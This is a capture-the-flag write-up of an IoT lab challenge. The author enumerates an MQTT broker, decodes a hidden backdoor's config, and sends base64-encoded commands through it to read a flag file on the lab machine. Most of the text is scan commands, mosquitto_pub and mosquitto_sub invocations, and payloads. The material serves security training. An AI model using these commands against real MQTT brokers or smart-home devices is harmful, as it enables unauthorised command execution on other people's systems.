## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
John likes to live in a very Internet connected world. Maybe too connected...
John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  
  
_Note: the machine may take 3-5 minutes to fully boot._
```

## IP-Address
```IP-Address
10.201.33.162
```

## Rustscan 
```bash
$ rustscan -a 10.201.33.162 -b 450 -t 2000 --ulimit 5000 -- -e tun0 

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 60
1883/tcp open  mqtt    syn-ack ttl 59
```

After checking the rustscan we remember about the `mosquitto_sub` which allow real time monitoring 
```bash
kali㉿kali)-[~]
└─$ mosquitto_sub -h 10.201.33.162 -t "#" -v                                        
patio/lights {"id":11007265148521987250,"color":"RED","status":"ON"}
storage/thermostat {"id":4090523328619348627,"temperature":23.687849}
frontdeck/camera {"id":8812243887239517469,"yaxis":-156.19885,"xaxis":-64.76042,"zoom":0.19398512,"movement":false}
livingroom/speaker {"id":17519711158967038694,"gain":71}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
storage/thermostat {"id":15198525349764586117,"temperature":23.139374}
kitchen/toaster {"id":7299482473546062628,"in_use":true,"temperature":155.2406,"toast_time":249}
patio/lights {"id":15500613726022222691,"color":"RED","status":"OFF"}
livingroom/speaker {"id":16514358662368137796,"gain":69}
storage/thermostat {"id":2110333105355259668,"temperature":23.758905}
frontdeck/camera {"id":17891142290201999351,"yaxis":-65.30782,"xaxis":-96.225494,"zoom":2.846683,"movement":true}
livingroom/speaker {"id":4172028180733498623,"gain":43}
kitchen/toaster {"id":10397286253542137269,"in_use":false,"temperature":150.95088,"toast_time":140}
patio/lights {"id":3556765210707196385,"color":"BLUE","status":"ON"}
storage/thermostat {"id":15055270013187876656,"temperature":24.370743}
livingroom/speaker {"id":3979258055383625699,"gain":51}
storage/thermostat {"id":7080434694410836061,"temperature":23.614883}
patio/lights {"id":9318459596346032962,"color":"PURPLE","status":"OFF"}
```
after analyzing we found that the 
```milicious
Directory
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config 

base64
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```
and where 
```base64_decode
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```
then 
The pattern indicates:
- `/sub` is the **subscription** topic where we listen for a response.
- `/pub` is the **publish** topic where we send commands (as Base64-encoded JSON).
## 📦 Step 1: Understand MQTT Basics
- MQTT uses a **publish-subscribe model**.
- We use `mosquitto_pub` to send data and `mosquitto_sub` to listen.
- Each message payload is Base64-encoded JSON, containing at least an `id`, `cmd`, and `arg`.
Payload structure:
```bash
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "cmd": "CMD",
  "arg": "cat /home/challenge/flag.txt"
}
```
encode
```bash
echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat /home/challenge/flag.txt"}' | base64
```
Result:
```bash
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IC9ob21lL2NoYWxsZW5nZS9mbGFnLnR4dCJ9
```
## Step 3: Publishing the Payload

Send the command to the MQTT broker:
```bash
mosquitto_pub -h 10.201.33.162 \
  -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" \
  -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IC9ob21lL2NoYWxsZW5nZS9mbGFnLnR4dCJ9"
```
alternatively listen
```bash
mosquitto_sub -h 10.201.33.162 \
  -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
```
and received
```bash
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
```
Decode the response:
```bash 
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9" | base64 -d
```
Result:
```bash
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "[flag omitted]\n"
}
```

Got the flag
```Flag
[flag omitted]
```